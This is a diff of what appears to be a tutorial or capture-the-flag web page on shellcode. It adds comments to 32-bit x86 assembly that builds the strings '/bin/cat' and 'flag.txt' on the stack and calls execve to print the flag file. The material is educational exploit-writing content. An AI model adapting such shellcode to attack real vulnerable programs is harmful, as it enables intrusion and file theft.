@@ -166,12 +166,12 @@ global main
 SECTION .text
 
 main:
-xor    eax,eax
-push   eax ; env<br>
-push   0x7461632f ;"tac/"
-push   0x6e69622f ;"inb/"
+xor    eax,eax     ; set eax to 0
+push   eax         ; end of string
+push   0x7461632f  ;"tac/"
+push   0x6e69622f  ;"inb/"
 mov    ebx,esp
-push   eax
+push   eax         ; end of string
 </pre>
 <pre id="opcode">
 push   0x7478742e
@@ -179,10 +179,10 @@ push   0x67616c66
 </pre>
 <pre>
 mov    ecx,esp
-push   eax
-push   ecx
-push   ebx
-mov    ecx,esp
+push   eax  ; null
+push   ecx  ; file
+push   ebx  ; /bin/cat
+mov    ecx,esp ; {/bin/cat,file,null}
 xor eax,eax
 add eax,0xb
 int 0x80
